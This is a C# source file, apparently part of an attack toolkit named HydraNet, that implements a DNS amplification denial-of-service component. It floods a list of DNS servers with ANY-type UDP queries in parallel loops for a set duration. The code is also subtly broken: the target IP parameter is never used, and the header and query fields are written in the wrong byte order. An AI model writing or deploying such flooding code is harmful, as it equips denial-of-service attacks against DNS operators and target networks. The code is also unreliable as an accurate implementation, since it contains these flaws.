namespace HydraNet.Attacks;

using System.Net;
using System.Net.Sockets;

public sealed class DnsAmplification
{
    private long _queriesSent;

    public long TotalQueries => _queriesSent;

    public async Task ExecuteAsync(string targetIp, string[] dnsServers, string queryDomain, int durationSeconds, CancellationToken ct)
    {
        var endTime = DateTime.UtcNow.AddSeconds(durationSeconds);

        var tasks = dnsServers.Select(server =>
            Task.Run(() => QueryLoop(targetIp, server, queryDomain, endTime, ct), ct));

        await Task.WhenAll(tasks);
    }

    private void QueryLoop(string targetIp, string dnsServer, string domain, DateTime endTime, CancellationToken ct)
    {
        var query = BuildDnsQuery(domain);
        var serverEndpoint = new IPEndPoint(IPAddress.Parse(dnsServer), 53);

        while (DateTime.UtcNow < endTime && !ct.IsCancellationRequested)
        {
            try
            {
                using var socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                socket.SendTo(query, serverEndpoint);
                Interlocked.Increment(ref _queriesSent);
            }
            catch (SocketException)
            {
            }
        }
    }

    private static byte[] BuildDnsQuery(string domain)
    {
        var parts = domain.Split('.');
        using var ms = new MemoryStream();
        using var writer = new BinaryWriter(ms);

        writer.Write((ushort)Random.Shared.Next(0, 65535));
        writer.Write((ushort)0x0100);
        writer.Write((ushort)1);
        writer.Write((ushort)0);
        writer.Write((ushort)0);
        writer.Write((ushort)0);

        foreach (var part in parts)
        {
            writer.Write((byte)part.Length);
            writer.Write(System.Text.Encoding.ASCII.GetBytes(part));
        }
        writer.Write((byte)0);
        writer.Write((ushort)255);
        writer.Write((ushort)1);

        return ms.ToArray();
    }
}
